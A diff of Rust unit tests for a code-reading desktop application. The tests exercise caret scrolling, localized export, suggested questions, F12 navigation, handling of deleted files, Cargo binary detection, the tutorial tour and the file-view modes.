+/// M8: the code seen made shorter — the bottom panel opened for a fake
+/// run — keeps the cursor's line in sight: tax() at line 27, seen, went
+/// under the panel with the margin's card. A line not seen before is not
+/// sought out, and a taller view moves nothing.
+#[test]
+fn a_shorter_code_view_keeps_the_cursor_line_in_sight() {
+    let mut app = scanned_app("caret-kept-in-sight");
+    open_synchronously(&mut app, "src/lib.rs", None);
+    let lh = app.line_height();
+    let pane = app.proj.active;
+    let set = |app: &mut App, caret: usize, scroll: f32, h: f32| {
+        let v = app.active_viewer_mut().unwrap();
+        v.viewport_measured = true;
+        v.viewport_h = h;
+        v.bounds_h = h;
+        v.scroll_y = scroll;
+        v.caret = Some((caret, 0));
+    };
+    let measured = |app: &mut App, h: f32| {
+        let _ = app.update(Message::Editor(EditorMsg::ViewMeasured { pane, height: h }));
+        app.active_viewer().unwrap().scroll_y
+    };
+    // Seen at the foot of a tall view; the view made short: still seen,
+    // with lines under it.
+    set(&mut app, 26, 0.0, 30.0 * lh);
+    let y = measured(&mut app, 16.0 * lh);
+    let top = 26.0 * lh;
+    assert!(top >= y && top + lh <= y + 16.0 * lh, "out of sight at {y}");
+    assert!(y > 0.0, "not scrolled");
+    // Not seen before: left where it was.
+    set(&mut app, 26, 0.0, 10.0 * lh);
+    assert_eq!(measured(&mut app, 8.0 * lh), 0.0);
+    // Taller: nothing moves.
+    set(&mut app, 5, 0.0, 10.0 * lh);
+    assert_eq!(measured(&mut app, 30.0 * lh), 0.0);
+    // The window made taller: the view's height is guessed at the window's
+    // first, then measured, taller than it was but shorter than the guess.
+    // That is no view shrinking, and the line just under its foot, never
+    // seen, stays where it is (the code jumped down to it).
+    set(&mut app, 12, 0.0, 10.0 * lh);
+    let _ = app.on_window_resized(iced::Size::new(1200.0, 40.0 * lh));
+    assert!(app.active_viewer().unwrap().viewport_h >= 40.0 * lh);
+    assert_eq!(measured(&mut app, 11.0 * lh), 0.0, "scrolled on a resize");
+    // And the same through a scroll's report of the height.
+    set(&mut app, 12, 0.0, 10.0 * lh);
+    let _ = app.on_window_resized(iced::Size::new(1200.0, 40.0 * lh));
+    let _ = app.update(Message::Editor(EditorMsg::Scrolled(
+        pane,
+        a_viewport_at_top(11.0 * lh),
+    )));
+    assert_eq!(app.active_viewer().unwrap().scroll_y, 0.0);
+}
+
 /// The Glossary page (⋯ menu → Glossary) covers the code like the overview
 /// and the stats do, leaves for a file the way they do, and only opens on a
 /// project.
@@ -32752,6 +35543,34 @@ fn hovering_a_glossary_term_shows_its_definition() {
     assert_eq!(app.hover_summary(0, 0, 11), None);
 }
 
+/// A run's tour is exported as the sidebar names it, in the language
+/// spoken — it was "Run: main.py" in English whatever the export's
+/// language — and its scope as the sidebar says it, not "@trace main.py".
+#[test]
+fn an_export_names_a_runs_tour_in_the_language_spoken() {
+    let mut app = scanned_app("export-run-tour");
+    app.proj
+        .walk
+        .library
+        .push(crate::ai::walkthrough::Walkthrough {
+            made: None,
+            title: crate::ai::walkthrough::plain_run_title("main.py"),
+            scope: "@trace main.py".into(),
+            steps: Vec::new(),
+        });
+    let written =
+        crate::i18n::with_lang(crate::i18n::Lang::Fr, || app.export_markdown()).expect("an export");
+    let title = crate::i18n::with_lang(crate::i18n::Lang::Fr, || {
+        tr!("Debug run of {program}", program = "main.py")
+    });
+    let scope = crate::i18n::with_lang(crate::i18n::Lang::Fr, || {
+        tr!("Debug run ({program})", program = "main.py")
+    });
+    assert!(written.contains(&format!("### {title}")), "{written}");
+    assert!(written.contains(&scope), "{written}");
+    assert!(!written.contains("@trace"), "{written}");
+}
+
 /// Export Notes writes the reading notes where the save dialog pointed, and
 /// says so; a cancelled dialog and a failed write each say what happened.
 #[test]
@@ -32785,6 +35604,7 @@ fn export_notes_writes_the_markdown_where_picked() {
         .walk
         .library
         .push(crate::ai::walkthrough::Walkthrough {
+            made: None,
             title: "A tour".into(),
             scope: String::new(),
             steps: Vec::new(),
@@ -32842,7 +35662,7 @@ fn export_notes_writes_the_markdown_where_picked() {
         "{written}"
     );
     assert!(
-        written.contains("- `src/lib.rs` · `origin` ✓ understood\n  > returns the origin\n"),
+        written.contains("- `origin` in `src/lib.rs` ✓ understood\n  > returns the origin\n"),
         "{written}"
     );
     assert!(
@@ -33103,7 +35923,7 @@ fn an_export_waits_for_the_docs_index_its_glossary_needs() {
     );
     let text = std::fs::read_to_string(&path).unwrap();
     assert!(
-        text.contains("- **`Point`** (struct) — A point on the plane · `src/lib.rs:1`"),
+        text.contains("- **`Point`** (struct) — A point on the plane (`src/lib.rs:1`)"),
         "{text}"
     );
 
@@ -33123,7 +35943,7 @@ fn an_export_waits_for_the_docs_index_its_glossary_needs() {
     );
 }
 
-/// The "Trace value at cursor" action traces the name under the caret — it
+/// The "Trace value" action traces the name under the caret — it
 /// asks for a language server, which this fixture has none of — and says
 /// what to do without a caret. A trace cut at the cap says so whatever mix
 /// of definitions and references overflowed it, and a row never read moves
@@ -34039,10 +36859,12 @@ fn a_stopped_answer_says_where_it_stopped() {
 }
 
 /// "Try asking" offers the model's questions, written for where the reader
-/// is, once they come — asked for as the empty card opens, and afresh for
-/// each new session, which draws another few of them at once. Without a key
-/// nothing is asked, and the templates are offered; questions written for
-/// another file are not offered on this one.
+/// is, once they come — asked for as the empty card opens, once a place: a
+/// new session draws another few of them, and asks nothing. While they are
+/// written nothing is offered that they would replace under the pointer.
+/// Without a key, or with the setting off, nothing is asked and the
+/// templates are offered; questions written for another file are not
+/// offered on this one.
 #[test]
 fn try_asking_offers_questions_written_for_here() {
     let mut app = scanned_app("ask-suggest");
@@ -34067,6 +36889,12 @@ fn try_asking_offers_questions_written_for_here() {
     let _ = app.update(Message::Ask(AskMsg::Open));
     let key = app.proj.suggest_asked.clone().expect("questions asked for");
     assert_eq!(key.file.as_deref(), Some("src/lib.rs"));
+    assert!(app.suggestions_coming());
+    assert!(
+        app.suggested_questions().is_empty(),
+        "templates offered, to be swapped under the pointer: {:?}",
+        app.suggested_questions()
+    );
     let written: String = (1..=8)
         .map(|i| format!("{i}. Question {i} about lib.rs?\n"))
         .collect();
@@ -34079,9 +36907,12 @@ fn try_asking_offers_questions_written_for_here() {
     let first = app.suggested_questions();
     assert_eq!(first.len(), 4);
     assert!(first.iter().all(|q| q.starts_with("Question")), "{first:?}");
-    // A new session: another draw at once, and asked afresh.
+    // A new session: another draw at once, and nothing asked.
     let _ = app.update(Message::Ask(AskMsg::NewSession));
-    assert!(app.proj.suggest_asked.is_some(), "asked afresh");
+    assert!(
+        app.proj.suggest_asked.is_none(),
+        "asked again for the same place"
+    );
     let second = app.suggested_questions();
     assert_ne!(first, second, "the same few again");
     // On another file, they are not this one's.
@@ -34090,6 +36921,86 @@ fn try_asking_offers_questions_written_for_here() {
         !app.suggested_questions()
             .iter()
             .any(|q| q.starts_with("Question")),
+        "{:?}",
+        app.suggested_questions()
+    );
+    // Switched off (Settings → Usage and cost): nothing asked, templates.
+    let _ = app.update(Message::Usage(UsageMsg::SuggestQuestions(false)));
+    let _ = app.update(Message::Ask(AskMsg::Close));
+    let _ = app.update(Message::Ask(AskMsg::Open));
+    assert!(
+        app.proj.suggest_asked.is_none(),
+        "asked with the setting off"
+    );
+    assert!(
+        app.suggested_questions()
+            .iter()
+            .any(|q| q.contains("entry point")),
+        "{:?}",
+        app.suggested_questions()
+    );
+}
+
+/// "Suggest questions in Ask" switched off offers the general questions
+/// even where the model's are kept, waits for nothing, and asks nothing;
+/// a reply that lands meanwhile is kept for its place, not shown; switched
+/// back on, what came is offered with no second request. A reply for a
+/// place the reader has left does not replace the questions for where
+/// they are, and a short pool shows all it has.
+#[test]
+fn suggested_questions_follow_their_switch_and_their_place() {
+    let mut app = scanned_app("ask-suggest-off");
+    open_synchronously(&mut app, "src/lib.rs", None);
+    dismiss_overlays(&mut app);
+    app.llm_available = true;
+    app.llm_config_cache = Some(Some(unreachable_llm()));
+    let _ = app.update(Message::Ask(AskMsg::Open));
+    let here = app.proj.suggest_asked.clone().expect("asked for here");
+    // Off while the request is out: the general questions, nothing awaited.
+    let _ = app.update(Message::Usage(UsageMsg::SuggestQuestions(false)));
+    assert!(!app.suggestions_coming());
+    assert!(
+        app.suggested_questions()
+            .iter()
+            .any(|q| q.contains("entry point")),
+        "{:?}",
+        app.suggested_questions()
+    );
+    let _ = app.update(Message::Ask(AskMsg::SuggestionsCame {
+        stamp: app.stamp(),
+        key: here.clone(),
+        result: Ok("Question 1?\nQuestion 2?\nQuestion 3?\n".into()),
+    }));
+    assert!(
+        !app.suggested_questions()
+            .iter()
+            .any(|q| q.starts_with("Question")),
+        "the model's questions offered with the setting off"
+    );
+    // Back on: what came is offered, and nothing is asked again.
+    let _ = app.update(Message::Usage(UsageMsg::SuggestQuestions(true)));
+    let _ = app.update(Message::Ask(AskMsg::Close));
+    let _ = app.update(Message::Ask(AskMsg::Open));
+    assert!(app.proj.suggest_asked.is_none(), "asked a second time");
+    assert_eq!(
+        app.suggested_questions(),
+        vec!["Question 1?", "Question 2?", "Question 3?"],
+        "a pool of three shows three"
+    );
+    // A late reply for another place leaves these as they are.
+    let elsewhere = crate::app::suggest::SuggestKey {
+        file: Some("notes.txt".into()),
+        function: None,
+    };
+    let _ = app.update(Message::Ask(AskMsg::SuggestionsCame {
+        stamp: app.stamp(),
+        key: elsewhere,
+        result: Ok("Other 1?\n".into()),
+    }));
+    assert!(
+        app.suggested_questions()
+            .iter()
+            .all(|q| q.starts_with("Question")),
         "{:?}",
         app.suggested_questions()
     );
@@ -34148,6 +37059,226 @@ fn a_notice_on_the_status_line_goes_once_read() {
     let _ = app.update(Message::Noop);
     let _ = app.update(Message::Tick);
     assert_eq!(app.status, "Copied 3 lines");
+}
+
+/// F12 is Go to Definition and ⇧F12 Find References, as most editors have
+/// them: F12 did nothing, and said nothing. Here, with no language server
+/// up, each says so, as `gd` and `gr` do.
+#[test]
+fn f12_goes_to_the_definition_and_shift_f12_finds_references() {
+    use keyboard::key::Named;
+    let mut app = scanned_app("f12-goto");
+    open_synchronously(&mut app, "src/lib.rs", None);
+    dismiss_overlays(&mut app);
+    app.code_focused = true;
+    if let Some(v) = app.proj.panes[0].as_mut() {
+        v.caret = Some((0, 4));
+    }
+    let said = |app: &mut App, shift: bool| {
+        app.status.clear();
+        let modifiers = if shift {
+            keyboard::Modifiers::SHIFT
+        } else {
+            keyboard::Modifiers::empty()
+        };
+        let _ = app.update(key_press(keyboard::Key::Named(Named::F12), modifiers));
+        app.status.clone()
+    };
+    let by_gd = {
+        app.status.clear();
+        let _ = app.update(key_press(
+            keyboard::Key::Character("g".into()),
+            keyboard::Modifiers::empty(),
+        ));
+        let _ = app.update(key_press(
+            keyboard::Key::Character("d".into()),
+            keyboard::Modifiers::empty(),
+        ));
+        app.status.clone()
+    };
+    assert!(!by_gd.is_empty(), "gd said nothing");
+    assert_eq!(said(&mut app, false), by_gd, "F12 is gd");
+    assert!(!said(&mut app, true).is_empty(), "⇧F12 said nothing");
+    // Not under a menu: menus let function keys through, and it went to a
+    // definition under the open menu.
+    app.show_app_menu = true;
+    app.code_focused = true;
+    assert_eq!(said(&mut app, false), "", "under the menu");
+    app.show_app_menu = false;
+    // Not with a page over the code.
+    let _ = app.update(Message::Overview(OverviewMsg::ShowStats));
+    app.code_focused = true;
+    assert_eq!(said(&mut app, false), "");
+}
+
+/// L9: a file deleted since it was read is said to be no longer there
+/// when it is gone to again, and marked for the reading trail to leave
+/// out (`ui::tests::the_trail_leaves_out_a_file_gone`): it stayed
+/// in the trail, and a press on it said only an error of the system's
+/// ("empty.py: cannot resolve path: No such file or directory").
+#[test]
+fn a_deleted_file_is_said_gone_and_leaves_the_trail() {
+    let mut app = scanned_app("deleted-trail");
+    let root = app.proj.project.as_ref().unwrap().root.clone();
+    std::fs::write(root.join("src/util.rs"), "pub fn util() {}\n").unwrap();
+    open_synchronously(&mut app, "src/util.rs", None);
+    open_synchronously(&mut app, "notes.txt", None);
+    open_synchronously(&mut app, "src/lib.rs", None);
+    dismiss_overlays(&mut app);
+    let notes = root.join("notes.txt");
+    let lib = root.join("src/lib.rs");
+    let current = |app: &App| {
+        app.proj
+            .history
+            .flatten()
+            .into_iter()
+            .find(|v| v.is_current)
+            .map(|v| v.loc.path)
+    };
+    let fresh = |app: &mut App| {
+        app.proj.gone_files.clear();
+        app.status.clear();
+    };
+    // Gone before it was asked for: said so at once, and the trail stays
+    // on the file read — it took the gone file as the place read.
+    std::fs::remove_file(&notes).unwrap();
+    let _ = app.update(Message::Editor(EditorMsg::OpenRel {
+        rel: "notes.txt".into(),
+        line: None,
+    }));
+    assert_eq!(app.status, "notes.txt is no longer there");
+    assert!(
+        app.proj.gone_files.contains(&notes),
+        "marked gone, for the trail to leave out"
+    );
+    assert!(app.proj.link.pane_pending[app.proj.active].is_none());
+    assert_eq!(current(&app), Some(lib.clone()));
+
+    // Gone while it loads: said so as it fails, and the trail goes back to
+    // the file still shown.
+    fresh(&mut app);
+    std::fs::write(&notes, "hello\n").unwrap();
+    let _ = app.update(Message::Editor(EditorMsg::OpenRel {
+        rel: "notes.txt".into(),
+        line: None,
+    }));
+    assert_eq!(current(&app), Some(notes.clone()));
+    std::fs::remove_file(&notes).unwrap();
+    let pane = app.proj.active;
+    let req = app.proj.link.pane_pending[pane].expect("a load");
+    let _ = app.update(Message::Editor(EditorMsg::FileLoaded {
+        stamp: app.stamp(),
+        req,
+        pane,
+        abs: notes.clone(),
+        target: None,
+        result: Err("cannot resolve path: No such file or directory (os error 2)".into()),
+    }));
+    assert_eq!(app.status, "notes.txt is no longer there");
+    assert!(app.proj.gone_files.contains(&notes));
+    assert_eq!(
+        current(&app),
+        Some(lib.clone()),
+        "the trail kept the gone file"
+    );
+
+    // Gone to from the trail: said so, and the trail stays on the file read
+    // — it moved to the gone file, and the status said the system's error.
+    fresh(&mut app);
+    let gone = app.proj.history.loc(1).cloned().unwrap();
+    assert_eq!(gone.path, notes);
+    let _ = app.update(Message::Reading(ReadingMsg::HistoryJump {
+        id: 1,
+        loc: gone,
+    }));
+    assert_eq!(app.status, "notes.txt is no longer there");
+    assert!(app.proj.gone_files.contains(&notes));
+    assert_eq!(
+        current(&app),
+        Some(lib.clone()),
+        "the trail moved to a file not there"
+    );
+
+    // Back goes past it, to the file read before: it stopped there, and
+    // the next Back stopped there again.
+    fresh(&mut app);
+    let _ = app.update(Message::Reading(ReadingMsg::GoBack));
+    assert_eq!(current(&app), Some(root.join("src/util.rs")));
+    assert!(app.proj.gone_files.contains(&notes), "passed, and left out");
+    assert_eq!(
+        app.status, "notes.txt is no longer there",
+        "passed over without a word"
+    );
+    // Forward, the same way back.
+    let _ = app.update(Message::Reading(ReadingMsg::GoForward));
+    assert_eq!(current(&app), Some(lib.clone()));
+    // With only gone files back there, it stays, and says so.
+    std::fs::remove_file(root.join("src/util.rs")).unwrap();
+    fresh(&mut app);
+    let _ = app.update(Message::Reading(ReadingMsg::GoBack));
+    assert_eq!(current(&app), Some(lib.clone()));
+    assert_eq!(app.status, "src/util.rs is no longer there");
+
+    // Opened again later, the trail it left leaves the gone files out from
+    // the start, not only once one is gone to again.
+    let text = crate::history::to_text(&root, &app.proj.history).unwrap();
+    crate::history::save_text(&root, Some(&text)).unwrap();
+    let state = LoadedProjectState::read(&root, None, true);
+    let mut said = state.gone.clone();
+    said.sort();
+    assert_eq!(said, vec![notes.clone(), root.join("src/util.rs")]);
+    fresh(&mut app);
+    let _ = app.on_project_state_loaded(state);
+    assert!(app.proj.gone_files.contains(&notes));
+
+    // Back again: in the trail again.
+    std::fs::write(&notes, "hello\n").unwrap();
+    open_synchronously(&mut app, "notes.txt", None);
+    assert!(!app.proj.gone_files.contains(&notes));
+    // Read through clew-server too: it stayed out of the trail for good.
+    app.proj.gone_files.insert(notes.clone());
+    let source = "hello\n".to_string();
+    let lines = crate::highlight::plain_lines(&source);
+    let pane = app.proj.active;
+    let _ = app.apply_file_content(
+        pane,
+        None,
+        "notes.txt".into(),
+        source,
+        lines,
+        Vec::new(),
+        Vec::new(),
+        Vec::new(),
+    );
+    assert!(
+        !app.proj.gone_files.contains(&notes),
+        "back, read through the server, and still left out"
+    );
+
+    // Gone while Back's load is under way: the trail stays on the file
+    // still shown — it went one further back than it.
+    std::fs::write(root.join("src/util.rs"), "pub fn util() {}\n").unwrap();
+    open_synchronously(&mut app, "src/util.rs", None);
+    open_synchronously(&mut app, "src/lib.rs", None);
+    let shown = app.active_viewer().map(|v| v.abs.clone());
+    assert_eq!(shown, Some(lib.clone()));
+    fresh(&mut app);
+    let _ = app.update(Message::Reading(ReadingMsg::GoBack));
+    let util = root.join("src/util.rs");
+    assert_eq!(current(&app), Some(util.clone()));
+    std::fs::remove_file(&util).unwrap();
+    let pane = app.proj.active;
+    let req = app.proj.link.pane_pending[pane].expect("Back's load");
+    let _ = app.update(Message::Editor(EditorMsg::FileLoaded {
+        stamp: app.stamp(),
+        req,
+        pane,
+        abs: util.clone(),
+        target: None,
+        result: Err("No such file or directory (os error 2)".into()),
+    }));
+    assert_eq!(app.status, "src/util.rs is no longer there");
+    assert_eq!(current(&app), Some(lib.clone()), "not the file shown");
 }
 
 /// A page over the code — the overview, the statistics, a doc page — is put
@@ -34222,16 +37353,49 @@ fn debug_suggests_a_launch_config_in_the_projects_language() {
     let mut app = scanned_app("debug-launch-example");
     let root = app.proj.project.as_ref().unwrap().root.clone();
     std::fs::write(root.join("Cargo.toml"), "[package]\nname = \"x\"\n").unwrap();
-    let name = root.file_name().unwrap().to_string_lossy().into_owned();
+    // A library: nothing to run, said so — not a binary named after the
+    // folder, built for nothing.
     let _ = app.update(Message::Debug(DebugMsg::Start));
-    assert!(
-        app.status.contains(&format!("target/debug/{name}")),
-        "{}",
-        app.status
-    );
+    assert!(app.status.contains("library"), "{}", app.status);
+    // With a main, the binary Cargo builds, by the package's name.
+    std::fs::write(root.join("src/main.rs"), "fn main() {}\n").unwrap();
+    let _ = app.update(Message::Debug(DebugMsg::Start));
+    assert!(app.status.contains("target/debug/x"), "{}", app.status);
     assert!(!app.status.contains("python"), "{}", app.status);
+    // A [[bin]] of another name, by its own.
+    std::fs::write(
+        root.join("Cargo.toml"),
+        "[package]\nname = \"x\"\n[[bin]]\nname = \"tool\"\npath = \"src/main.rs\"\n",
+    )
+    .unwrap();
+    let _ = app.update(Message::Debug(DebugMsg::Start));
+    assert!(app.status.contains("target/debug/tool"), "{}", app.status);
     // A script project, by the file open.
     assert!(crate::app::tasks::launch_example(&root, Some("ruby")).contains("main.rb"));
+}
+
+/// The binary a crate builds is the one Cargo names: `src/bin/<name>.rs`
+/// is `<name>`, not the package; and a workspace's root library is not
+/// "nothing to run" — its members may well run.
+#[test]
+fn the_binary_a_crate_builds_is_the_one_cargo_names() {
+    use crate::app::tasks::cargo_binary;
+    let root = test_dir("cargo-binary-names");
+    std::fs::create_dir_all(root.join("src/bin/served")).unwrap();
+    std::fs::write(root.join("Cargo.toml"), "[package]\nname = \"pkg\"\n").unwrap();
+    assert_eq!(cargo_binary(&root), Some(None), "nothing in src/bin yet");
+    std::fs::write(root.join("src/bin/served/main.rs"), "fn main() {}\n").unwrap();
+    std::fs::write(root.join("src/bin/cli.rs"), "fn main() {}\n").unwrap();
+    assert_eq!(cargo_binary(&root), Some(Some("cli".into())));
+    std::fs::remove_file(root.join("src/bin/cli.rs")).unwrap();
+    assert_eq!(cargo_binary(&root), Some(Some("served".into())));
+    std::fs::remove_dir_all(root.join("src/bin")).unwrap();
+    std::fs::write(
+        root.join("Cargo.toml"),
+        "[package]\nname = \"pkg\"\n[workspace]\nmembers = [\"app\"]\n",
+    )
+    .unwrap();
+    assert_eq!(cargo_binary(&root), None, "a workspace's members may run");
 }
 
 /// A save says which provider is in use without nesting parentheses — the
@@ -34357,7 +37521,7 @@ fn the_tour_gives_the_readers_place_back() {
     dismiss_overlays(&mut app);
     let trail = |app: &App| app.proj.history.flatten().len();
     let before = trail(&app);
-    let _ = app.update(Message::Tutorial(TutorialMsg::Start));
+    let _ = app.update(Message::Tutorial(TutorialMsg::Begin));
     // As the tour goes: a page, another file and its visit.
     let _ = app.update(Message::Overview(OverviewMsg::ShowStats));
     open_synchronously(&mut app, "notes.txt", None);
@@ -34370,11 +37534,12 @@ fn the_tour_gives_the_readers_place_back() {
     assert_eq!(app.active_viewer().unwrap().rel, "src/lib.rs");
 }
 
-/// The tour points at the ⋯ menu's rows a group at a time, as the menu
-/// groups them — every row in one — not a step a row.
+/// The tour points at one row of the ⋯ menu — the glossary, the tool
+/// there for reading a project — and stays short: a chapter is a few
+/// steps, not a step for every row and button.
 #[test]
-fn the_tour_takes_the_menus_rows_a_group_at_a_time() {
-    use crate::app::tutorial::{Anchor, steps};
+fn the_tour_points_at_the_glossarys_row_and_stays_short() {
+    use crate::app::tutorial::{Anchor, Chapter, steps};
     let app = scanned_app("tour-menu-groups");
     let all = steps(&app);
     let menu: Vec<(usize, usize)> = all
@@ -34384,10 +37549,18 @@ fn the_tour_takes_the_menus_rows_a_group_at_a_time() {
             _ => None,
         })
         .collect();
-    assert_eq!(menu.len(), 3, "{menu:?}");
-    let covered: usize = menu.iter().map(|(_, n)| n).sum();
-    assert_eq!(covered, crate::ui::TOOLS_MENU_ROWS.len());
-    assert!(all.len() <= 34, "{} steps", all.len());
+    assert_eq!(menu, [(crate::ui::ToolsRow::Glossary.index(), 1)]);
+    assert!(all.len() <= 28, "{} steps", all.len());
+    // Chapters in order, each once: never back to one left behind.
+    let mut seen: Vec<Chapter> = Vec::new();
+    for step in &all {
+        if seen.last() != Some(&step.chapter) {
+            assert!(!seen.contains(&step.chapter), "{:?} again", step.chapter);
+            seen.push(step.chapter);
+        }
+    }
+    assert_eq!(seen.first(), Some(&Chapter::Welcome));
+    assert_eq!(seen.last(), Some(&Chapter::Done));
 }
 
 /// L9: Test connection asks the model the Language model page's fields
@@ -34415,8 +37588,26 @@ fn test_connection_asks_the_fields_model_and_says_what_it_found() {
     assert!(test(&mut app).is_empty(), "nothing to ask was asked");
     assert_eq!(
         app.settings.connection_test,
-        ConnectionTest::Failed("Name the model and its endpoint first.".into())
+        ConnectionTest::Failed(crate::app::state::TestFailure::Said(
+            "Name the model and its endpoint first.".into()
+        ))
     );
+    // A service that takes a key, with none: asked for, not tested — the
+    // server answered "no AI chat config", which said nothing to do.
+    app.settings.provider = llm::Provider::DeepSeek;
+    app.settings.key.clear();
+    app.settings.model = "deepseek-chat".into();
+    app.settings.base_url = "https://api.deepseek.com".into();
+    if std::env::var("DEEPSEEK_API_KEY").is_err() {
+        assert!(test(&mut app).is_empty(), "nothing to ask was asked");
+        assert_eq!(
+            app.settings.connection_test,
+            ConnectionTest::Failed(crate::app::state::TestFailure::Said(
+                "Enter the API key first.".into()
+            ))
+        );
+    }
+    app.settings.provider = llm::Provider::Custom;
 
     // An endpoint that answers: the model named in the field is the one
     // asked, saved or not.
@@ -34462,7 +37653,7 @@ fn test_connection_asks_the_fields_model_and_says_what_it_found() {
         let _ = app.update(msg);
     }
     assert!(
-        matches!(&app.settings.connection_test, ConnectionTest::Failed(why) if !why.is_empty()),
+        matches!(&app.settings.connection_test, ConnectionTest::Failed(why) if !why.said().is_empty()),
         "{:?}",
         app.settings.connection_test
     );
@@ -34646,4 +37837,1145 @@ async fn the_window_polls_until_a_sent_documents_diagnostics_come() {
         Some(Ok(snapshot)) => assert_eq!(snapshot.diagnostics(&lib).len(), 1),
         _ => panic!("no snapshot"),
     }
+}
+
+/// Skim on a file scrolled down keeps no more scroll than the folded file
+/// has: what now fits in the view shows from its first line. Line 8 stayed
+/// at the top, lines 1-7 above the view and its lower half empty.
+#[test]
+fn skim_keeps_no_more_scroll_than_the_folded_file_has() {
+    let mut app = scanned_app("skim-scroll-clamp");
+    let root = app.proj.project.as_ref().unwrap().root.clone();
+    let mut body = String::from("import os\n\n\n\n\n\n\ndef long():\n");
+    for i in 0..40 {
+        body.push_str(&format!("    x{i} = {i}\n"));
+    }
+    std::fs::write(root.join("long.py"), &body).unwrap();
+    open_synchronously(&mut app, "long.py", None);
+    dismiss_overlays(&mut app);
+    let abs = root.join("long.py");
+    app.proj.symbol_index_by_file.insert(
+        abs.clone(),
+        Arc::new(vec![SymbolEntry {
+            name: "long".into(),
+            kind: "function".into(),
+            rel: "long.py".into(),
+            abs,
+            line: 8,
+            is_test: false,
+            entry: None,
+        }]),
+    );
+    let lh = app.line_height();
+    let v = app.active_viewer_mut().unwrap();
+    v.symbols.clear();
+    v.bounds_h = 20.0 * lh;
+    v.scroll_y = 7.0 * lh;
+    let _ = app.update(Message::Editor(EditorMsg::SkimFile));
+    let v = app.active_viewer().unwrap();
+    assert!(v.content_rows() < 20, "folded: {} rows", v.content_rows());
+    assert_eq!(v.scroll_y, 0.0, "the folded file fits: shown from its top");
+}
+
+/// The file's views take turns: Diff, Time Travel and Skim each show the
+/// file another way, and turning one on turns the others off — a diff
+/// asked for under Time Travel never showed, its button lit all the same.
+#[test]
+fn the_files_views_take_turns() {
+    let mut app = scanned_app("file-views-take-turns");
+    open_synchronously(&mut app, "src/lib.rs", None);
+    dismiss_overlays(&mut app);
+    // Its one function, as the symbol index has it (as the Skim button's
+    // own test sets it up).
+    let abs = app.active_viewer().unwrap().abs.clone();
+    app.proj.symbol_index_by_file.insert(
+        abs.clone(),
+        Arc::new(vec![SymbolEntry {
+            name: "origin".into(),
+            kind: "function".into(),
+            rel: "src/lib.rs".into(),
+            abs,
+            line: 3,
+            is_test: false,
+            entry: None,
+        }]),
+    );
+    let skimmed = |app: &App| {
+        app.active_viewer()
+            .is_some_and(|v| v.skimmed(&app.skim_lines(&v.abs)))
+    };
+
+    // Skim, then Diff: the diff is asked for, the skim undone.
+    let _ = app.update(Message::Editor(EditorMsg::SkimFile));
+    assert!(skimmed(&app), "the fixture has bodies to fold");
+    let _ = app.update(Message::Editor(EditorMsg::ToggleDiff));
+    assert!(app.proj.diff_pending.is_some());
+    assert!(!skimmed(&app), "skimmed under the diff");
+
+    // Then Time Travel: the diff gives way.
+    let _ = app.update(Message::TimeTravel(TimeTravelMsg::Start { symbol: false }));
+    let _ = app.update(lib_history(&app, app.proj.time_gen));
+    assert!(crate::ui::time_travel_on_screen(&app).is_some());
+    assert!(app.proj.diff_pending.is_none() && app.proj.diff.is_none());
+
+    // Then Diff again: Time Travel ends, the diff is asked for.
+    let _ = app.update(Message::Editor(EditorMsg::ToggleDiff));
+    assert!(
+        app.proj.time_travel.is_none(),
+        "Time Travel stayed over the diff"
+    );
+    assert!(app.proj.diff_pending.is_some());
+
+    // Then Skim: the diff gives way.
+    let _ = app.update(Message::Editor(EditorMsg::SkimFile));
+    assert!(skimmed(&app));
+    assert!(app.proj.diff_pending.is_none() && app.proj.diff.is_none());
+
+    // Then Time Travel: the skim gives way.
+    let _ = app.update(Message::TimeTravel(TimeTravelMsg::Start { symbol: false }));
+    assert!(!skimmed(&app), "skimmed under Time Travel");
+}
+
+/// The reading guide is generated as one — said so on the status line —
+/// kept in the library under its own scope with its tree's depths, opened,
+/// and written again as a guide when regenerated.
+#[test]
+fn the_reading_guide_is_written_kept_and_regenerated_as_a_guide() {
+    use walkthrough::GUIDE_SCOPE;
+    let mut app = scanned_app("walk-guide");
+    let root = app.proj.project.as_ref().unwrap().root.clone();
+    app.llm_config_cache = Some(Some(unreachable_llm()));
+    let _ = app.update(Message::Walk(WalkMsg::Generate(GUIDE_SCOPE.into())));
+    assert_eq!(app.proj.walk.generating.as_deref(), Some(GUIDE_SCOPE));
+    assert!(app.status.contains("reading guide"), "{}", app.status);
+    let step = |title: &str, depth: usize| walkthrough::Step {
+        title: title.into(),
+        file: "src/lib.rs".into(),
+        symbol: Some("origin".into()),
+        line: None,
+        narration: "n".into(),
+        depth,
+        stop: None,
+    };
+    let guide = walkthrough::Walkthrough {
+        made: None,
+        title: "Where to start".into(),
+        scope: String::new(),
+        steps: vec![step("Start", 0), step("Then", 1)],
+    };
+    let _ = app.update(Message::Walk(WalkMsg::Done {
+        stamp: app.stamp(),
+        seq: app.proj.walk.pending.expect("awaited"),
+        scope: GUIDE_SCOPE.into(),
+        result: Ok(guide),
+    }));
+    assert_eq!(
+        app.proj.walk.open_tour().map(|w| w.scope.as_str()),
+        Some(GUIDE_SCOPE),
+        "the guide is opened"
+    );
+    let kept = walkthrough::load_library(&root);
+    let saved = kept.iter().find(|w| w.scope == GUIDE_SCOPE).expect("kept");
+    assert_eq!(
+        saved.steps.iter().map(|s| s.depth).collect::<Vec<_>>(),
+        [0, 1]
+    );
+    let again = run_task(app.update(Message::Walk(WalkMsg::Regenerate(GUIDE_SCOPE.into()))));
+    assert!(
+        again
+            .iter()
+            .any(|m| matches!(m, Message::Walk(WalkMsg::Generate(s)) if s == GUIDE_SCOPE)),
+        "{again:?}"
+    );
+}
+
+/// Where the Ask pill floats over the code's foot — a narrow window, no
+/// margin under it — the caret moved down a line at a time stays above it:
+/// it went on under the pill. Page Down puts the last line seen whole above
+/// the pill at the top, and find-next scrolls to a match under it. Where
+/// nothing floats over the code, the caret goes down to the view's last
+/// line.
+#[test]
+fn the_caret_keeps_clear_of_the_ask_pill() {
+    let mut app = blank_app();
+    let root = PathBuf::from("/nonexistent/clew-caret-pill");
+    let source: String = (0..200)
+        .map(|i| format!("let value_{i} = {i};\n"))
+        .collect();
+    let lines = crate::highlight::plain_lines(&source);
+    app.proj.project = Some(crate::Project {
+        root: root.clone(),
+        tree: Default::default(),
+        files: Arc::new(Vec::new()),
+        truncated: false,
+    });
+    app.proj.panes[0] = Some(Viewer::new(
+        root.join("src/lib.rs"),
+        "src/lib.rs".into(),
+        Some("rust"),
+        Arc::new(source),
+        lines,
+    ));
+    app.proj.active = 0;
